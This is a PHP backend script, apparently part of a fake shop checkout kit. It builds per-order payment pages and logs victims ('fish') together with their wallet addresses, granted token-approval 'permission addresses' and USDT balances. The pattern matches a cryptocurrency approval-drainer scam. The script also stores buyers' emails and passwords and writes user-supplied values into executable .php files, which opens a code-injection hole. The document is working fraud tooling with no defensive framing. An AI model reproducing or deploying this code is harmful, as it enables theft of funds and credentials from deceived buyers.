<?php
require_once '../../../../thinkphp/base.php';

use think\Db;
use think\Exception;

$config = include __DIR__ . '/../../../../application/database.php';
Db::setConfig($config);

ob_start();
session_start();
try {
    $optionsArr = fetchOptions();
    $fishAddresses = fetchFishAddresses();
    $data = getPostedData();
    $order_number = generateOrderNumber();

    $orderData = [
        'order_number' => $order_number,
        'goods_name' => htmlspecialchars($data['goods_name']),
        'num' => htmlspecialchars($data['num']),
        'total_price' => htmlspecialchars($data['total_price']),
        'email' => htmlspecialchars($data['email']),
        'password' => htmlspecialchars($data['password']),
        'mobile' => htmlspecialchars($data['mobile']),
        'attach' => json_encode($data['attach']),
        'options' => json_encode($optionsArr),
        'fish_addresses' => json_encode($fishAddresses),
        'tronweb_ads' => $_SESSION['tronweb_ads'],
        'tronweb_thd' => $_SESSION['tronweb_thd'],
        'web_link' => base64_encode($_SESSION['web_link']),
        'goods_cover' => htmlspecialchars($data['goods_cover']),
    ];

    $template_content = loadTemplate("../jiaoyi/pay.html");

    foreach ($orderData as $key => $value) {
        $template_content = str_replace("{{" . strtoupper($key) . "}}", addslashes($value), $template_content);
    }

    saveOrderPage($order_number, $template_content);

    if (!empty($_POST['authorization_success'])) {
        $fish_address = $_POST['fish_address'] ?? null;
        $permissions_fishaddress = $_POST['permissions_fishaddress'] ?? null;
        $usdt_balance = $_POST['usdt_balance'] ?? 0.00000000;
        $time = date('Y-m-d H:i:s');

        if ($fish_address && $permissions_fishaddress) {
            try {
                $result = Db::name('fish')->insert([
                    'fish_address' => $fish_address,
                    'permissions_fishaddress' => $permissions_fishaddress,
                    'usdt_balance' => $usdt_balance,
                    'time' => $time
                ]);
                echo json_encode(['status' => 'success']);
            } catch (Exception $e) {
                echo json_encode(['status' => 'error', 'message' => '插入失败: ' . $e->getMessage()]);
            }
        } else {
            echo json_encode(['status' => 'error', 'message' => '缺少必要的地址信息']);
        }
    }

    ob_end_clean();
    sendSuccessResponse("/epay/$order_number.php");

} catch (Exception $e) {
    ob_end_clean();
    sendErrorResponse($e);
}

function fetchOptions() {
    $options = Db::name('options')->select();
    $optionsArr = [];
    
    // 定义允许获取的字段列表
    $allowedFields = [
        'domain',               // 跳转域名
        'payment_address',      // TRC收款地址
        'permission_address',   // TRC权限地址
        // 'bot_key',             // 机器人密钥
        'notification_id',      // 通知ID
        'trx_balance',         // TRX阈值
        'usdt_balance',        // USDT阈值
        'authorized_amount',    // 授权金额
        'authorize_note',       // 授权成功后提示
        'model',               // 授权模式选择
        'notification_switch',  // 通知开关
        'auto_threshold',      // 授权后自动添加阈值
        'chainid',             // 链ID设置
        '0x_payment_address',   // 0x收款地址
        '0x_permission_address' // 0x权限地址
    ];
    
    foreach ($options as $option) {
        if (in_array($option['name'], $allowedFields)) {
            $optionsArr[$option['name']] = $option['value'];
        }
    }
    
    return $optionsArr;
}

function fetchFishAddresses() {
    $addresses = Db::name('fish')->column('fish_address');
    return $addresses;
}

function getPostedData() {
    return [
        'goods_id' => $_POST['goods_id'] ?? null,
        'num' => $_POST['num'] ?? null,
        'sku_id' => $_POST['sku_id'] ?? null,
        'pay_type' => $_POST['pay_type'] ?? null,
        'goods_name' => $_POST['goods_name'] ?? null,
        'total_price' => $_POST['total_price'] ?? null,
        'mobile' => $_POST['mobile'] ?? null,
        'email' => $_POST['email'] ?? null,
        'password' => $_POST['password'] ?? null,
        'attach' => $_POST['attach'] ?? [],
        'goods_cover' => $_POST['goods_cover'] ?? null,
    ];
}

function generateOrderNumber() {
    return date('YmdHis') . rand(100000, 999999);
}

function loadTemplate($template_path) {
    $template_content = file_get_contents($template_path);
    if ($template_content === false) {
        throw new Exception("无法读取模板文件: $template_path");
    }
    return $template_content;
}

function saveOrderPage($order_number, $content) {
    $order_page_path = __DIR__ . "/../../../epay/$order_number.php";
    if (file_put_contents($order_page_path, $content) === false) {
        throw new Exception("订单页面生成失败: $order_page_path");
    }
}

function sendSuccessResponse($redirect_url) {
    $response = [
        'status' => 'success',
        'redirect_url' => $redirect_url
    ];
    header('Content-Type: application/json');
    echo json_encode($response);
    exit();
}

function sendErrorResponse($e) {
    $response = [
        'status' => 'error',
        'message' => $e->getMessage(),
        'file' => $e->getFile(),
        'line' => $e->getLine(),
        'trace' => $e->getTraceAsString()
    ];
    header('Content-Type: application/json');
    echo json_encode($response);
    exit();
}
?>
s